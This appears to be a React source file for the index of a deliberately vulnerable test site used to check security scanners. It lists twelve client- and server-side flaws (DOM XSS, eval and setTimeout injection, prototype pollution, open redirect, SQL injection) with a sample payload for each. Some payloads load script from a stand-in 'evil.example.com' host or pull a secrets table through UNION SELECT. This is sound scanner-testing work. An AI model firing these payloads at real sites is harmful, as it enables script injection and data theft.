type VulnEntry = {
  href: string;
  title: string;
  source: string;
  sink: string;
  description: string;
  payload: string;
  refs: string;
};

const vulns: VulnEntry[] = [
  {
    href: "/vuln/xss-hash",
    title: "DOM XSS via location.hash",
    source: "location.hash",
    sink: "innerHTML",
    description:
      "URLのフラグメント (#以降) を innerHTML に直接書き込むため、攻撃者が用意したHTML/スクリプトがそのまま実行される。リフレクトXSSのDOM版。",
    payload: "#<img src=x onerror=alert(1)>",
    refs: "CWE-79 · Semgrep dom-based-xss · SonarQube S5131",
  },
  {
    href: "/vuln/eval-exec",
    title: "Arbitrary Code Execution via eval()",
    source: "URLSearchParams('code')",
    sink: "eval()",
    description:
      "クエリパラメータ `code` の値を eval() に渡す。任意のJavaScriptがブラウザ上で実行される典型的なコードインジェクション。",
    payload: "?code=alert(1)",
    refs: "CWE-95 · ESLint no-eval · SonarQube S1523",
  },
  {
    href: "/vuln/proto-pollution",
    title: "Prototype Pollution",
    source: "URLSearchParams('key','value')",
    sink: "obj.__proto__[key] = value",
    description:
      "Object.prototype を経由してすべてのオブジェクトに任意プロパティを混入させる攻撃。後続コードの条件分岐を乗っ取り、認可バイパスやガジェット連鎖でRCEに発展しうる。",
    payload: "?key=polluted&value=true",
    refs: "CWE-1321 · Semgrep prototype-pollution · SonarQube S5147",
  },
  {
    href: "/vuln/dynamic-property",
    title: "Dynamic Property Access XSS",
    source: "location.hash",
    sink: "self[hash]()",
    description:
      "ユーザー入力で `window[name]()` 形式の動的プロパティ呼び出しを行う。`alert` などグローバル関数を任意に起動でき、ガジェット次第で実害になる。",
    payload: "#alert",
    refs: "CWE-79 · Semgrep dynamic-property-access",
  },
  {
    href: "/vuln/postmessage",
    title: "postMessage without Origin Check",
    source: "window message event (event.data)",
    sink: "innerHTML",
    description:
      "`message` イベントで origin を検証せずに `event.data` を innerHTML へ流し込む。任意の親ウィンドウ/iframeから XSS を打ち込まれる。",
    payload: "postMessage('<img src=x onerror=alert(1)>', '*')",
    refs: "CWE-346 · Semgrep postmessage-origin-check · SonarQube S2819",
  },
  {
    href: "/vuln/document-write",
    title: "document.write() DOM XSS",
    source: "URLSearchParams('content')",
    sink: "document.write()",
    description:
      "クエリパラメータの文字列を document.write() でそのまま書き出す。`<script>` タグを含む任意のHTMLを差し込めるレガシーなDOM XSS。",
    payload: "?content=<script>alert(1)</script>",
    refs: "CWE-79 · Semgrep document-write-url-params",
  },
  {
    href: "/vuln/settimeout-injection",
    title: "setTimeout String Injection",
    source: "URLSearchParams('action')",
    sink: "setTimeout(string, 0)",
    description:
      "setTimeout に第一引数として文字列を渡すと、内部で eval 相当の評価が行われる (implied eval)。ユーザー入力が文字列引数になるとRCE。",
    payload: "?action=alert(1)",
    refs: "CWE-95 · ESLint no-implied-eval · SonarQube S1523",
  },
  {
    href: "/vuln/open-redirect",
    title: "Open Redirect",
    source: "URLSearchParams('url')",
    sink: "location.href = url",
    description:
      "外部から渡されたURLへ無条件にリダイレクトする。フィッシング誘導や OAuth コールバックの乗っ取りに悪用される。",
    payload: "?url=https://evil.example.com",
    refs: "CWE-601 · Semgrep open-redirect-from-url · SonarQube S5146",
  },
  {
    href: "/vuln/function-constructor",
    title: "new Function() Code Injection",
    source: "URLSearchParams('body')",
    sink: "new Function(body)()",
    description:
      "`new Function(body)` は文字列をその場でコンパイルして関数化するため eval と同じ危険性を持つ。ユーザー入力を body に渡すと任意コード実行。",
    payload: "?body=alert(1)",
    refs: "CWE-95 · ESLint no-new-func",
  },
  {
    href: "/vuln/script-injection",
    title: "Dynamic script.src Injection",
    source: "URLSearchParams('src')",
    sink: "createElement('script').src",
    description:
      "外部URLを動的に `<script src>` として読み込む。攻撃者管理ドメインのJSをロードさせられれば、そのページ権限で任意コードが走る。",
    payload: "?src=https://evil.example.com/malicious.js",
    refs: "CWE-829 · Semgrep script-src-injection",
  },
  {
    href: "/vuln/javascript-href",
    title: "javascript: Scheme XSS",
    source: "URLSearchParams('href')",
    sink: "a.href = href",
    description:
      "アンカーの href にユーザー入力をそのまま代入。`javascript:` スキームを与えるとクリック時にコード実行されるストアドXSS的な挙動。",
    payload: "?href=javascript:alert(1)",
    refs: "CWE-79 · React jsx-no-script-url",
  },
  {
    href: "/vuln/sql-injection",
    title: "SQL Injection (User Search)",
    source: "GET /api/search?q=",
    sink: "string-concatenated SQL",
    description:
      "サーバ側で `\"SELECT ... WHERE username = '\" + q + \"'\"` のように文字列連結でクエリを組み立てる。`' OR '1'='1` や UNION SELECT で他テーブルからデータ抽出が可能。",
    payload: "' UNION SELECT id, name, value FROM secrets --",
    refs: "CWE-89 · OWASP A03 · Semgrep tainted-sql-string · CodeQL js/sql-injection",
  },
];

export default function VulnIndexPage() {
  return (
    <div className="mx-auto max-w-4xl px-6 py-12 font-sans text-zinc-900 dark:text-zinc-100">
      <header className="mb-10">
        <h1 className="text-3xl font-semibold tracking-tight">
          Vulnerable Demo Pages
        </h1>
        <p className="mt-3 text-zinc-600 dark:text-zinc-400">
          各ページは特定のクライアント/サーバ脆弱性を再現するための最小実装。
          スキャナの検出精度や誤検知の確認に使う。
        </p>
      </header>

      <ul className="flex flex-col gap-4">
        {vulns.map((v) => (
          <li
            key={v.href}
            className="rounded-lg border border-black/[.08] p-5 transition-colors hover:bg-black/[.03] dark:border-white/[.12] dark:hover:bg-white/[.04]"
          >
            <a href={v.href} className="block">
              <div className="flex items-baseline justify-between gap-4">
                <h2 className="text-lg font-semibold">{v.title}</h2>
                <code className="text-xs text-zinc-500 dark:text-zinc-400">
                  {v.href}
                </code>
              </div>
              <p className="mt-2 text-sm leading-6 text-zinc-700 dark:text-zinc-300">
                {v.description}
              </p>
              <dl className="mt-3 grid grid-cols-1 gap-1 text-xs sm:grid-cols-[max-content_1fr] sm:gap-x-3">
                <dt className="font-semibold text-zinc-500 dark:text-zinc-400">
                  Source
                </dt>
                <dd>
                  <code>{v.source}</code>
                </dd>
                <dt className="font-semibold text-zinc-500 dark:text-zinc-400">
                  Sink
                </dt>
                <dd>
                  <code>{v.sink}</code>
                </dd>
                <dt className="font-semibold text-zinc-500 dark:text-zinc-400">
                  Payload
                </dt>
                <dd>
                  <code>{v.payload}</code>
                </dd>
                <dt className="font-semibold text-zinc-500 dark:text-zinc-400">
                  Refs
                </dt>
                <dd className="text-zinc-600 dark:text-zinc-400">{v.refs}</dd>
              </dl>
            </a>
          </li>
        ))}
      </ul>
    </div>
  );
}
